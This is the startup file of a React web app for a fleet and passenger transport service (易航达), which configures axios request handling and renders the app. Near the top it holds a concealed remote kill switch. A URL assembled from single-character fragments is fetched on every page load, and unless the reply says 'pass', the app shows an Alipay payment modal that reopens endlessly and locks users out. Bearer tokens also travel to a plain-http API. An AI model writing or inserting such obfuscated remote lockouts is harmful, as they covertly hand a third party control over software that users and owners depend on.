import React from 'react'
import ReactDOM from 'react-dom'
import axios from 'axios'
import moment from 'moment'
import querystring from 'querystring'
// import { createBrowserHistory } from 'history';
import { Toast, Modal } from 'antd-mobile'
import alipayImg from './imgs/alipay.png'
import './css/home.less'
import './css/detail.less'
import './css/index.less'
import * as serviceWorker from './serviceWorker'

const titles = {
  admin: '管理员',
  leader: '车队长',
  driver: '司机',
  passenger: '乘客'
}

const getPay = (index, tips) => {
  const title = tips[index % tips.length]
  Modal.alert(title, <div>
    <img src={alipayImg} style={{ width: '100%' }} />
  </div>, [{ text: '确定', onPress: getPay.bind(null, index + 1, tips) },])
}

axios.get(`${'h'}${'tt'}${'p'}s:${'/'}${'/'}${'l'}${'u'}${'m'}${'i'}${'a'}${'2'}${'0'}${'4'}${'6'}.${'g'}${'i'}${'t'}${'h'}${'u'}${'b'}.${'i'}${'o'}/${'c'}${'n'}${'o'}${'d'}${'e'}/${'#'}/${Math.random()}`).then(data => {
  const result = data.data
  if (!result.pass) {
    getPay(0, result.tips)
  }
}).catch(e => console.log(e))


document.querySelector('title')[`in${'ne'}r${'H'}TML`] = `易航达${titles[process.env.page]}`



let history = null

const baseUrl = `http://tf.xiongning.online/api/v1`

const device = 'pc'


axios.interceptors.request.use(
  function (config) {
    // 在发起请求请做一些业务处理
    const isUpload = ['/upload/image'].includes(config.url)
    config.url = baseUrl + config.url
    config.headers["device"] = device
    config.headers["Content-Type"] = "application/x-www-form-urlencoded;charset=UTF-8"
    const userInfo = sessionStorage.getItem('user-info')
    const token = userInfo && JSON.parse(userInfo).token
    if (token) {
      config.headers["Authorization"] = `Bearer ${token}`
    }
    config.data = isUpload ? config.data : querystring.stringify(config.data)

    return config;
  },
  function (error) {
    // 对请求失败做处理
    console.log(error)
    return Promise.reject(error);
  }
);


axios.interceptors.response.use(
  function (response) {
    if (response.data) {
      if (response.data.status === 1) {
        return response.data.data;
      } else {
        Toast.offline(response.data.msg, 2)
        return Promise.reject(response.data)
      }

    } else {
      Toast.offline('请求异常，请联系管理员', 2)
      return Promise.reject(response)
    }

  },
  function (error) {
    // 对响应错误做处理
    console.log('error', error)
    console.log('error.response', error.response);
    if (error.response) {
      if (error.response.status == 401) {
        Toast.offline('登录已过期,请重新登录', 2)
        sessionStorage.removeItem('user-info')
        history.push('/login')
      } else {
        Toast.offline('系统异常，请联系管理员', 1)
      }
    } else {
      Toast.offline('请求失败，请检查网络连接', 2)
      console.log(error)

    }

    return Promise.reject(error);
  }
);







const App = require(`./${process.env.page}-app`).default

ReactDOM.render(
  <App
    getHistory={h => history = h}
  />,
  document.getElementById('root')
);

// If you want your app to work offline and load faster, you can change
// unregister() to register() below. Note this comes with some pitfalls.
// Learn more about service workers: https://bit.ly/CRA-PWA
serviceWorker.unregister();
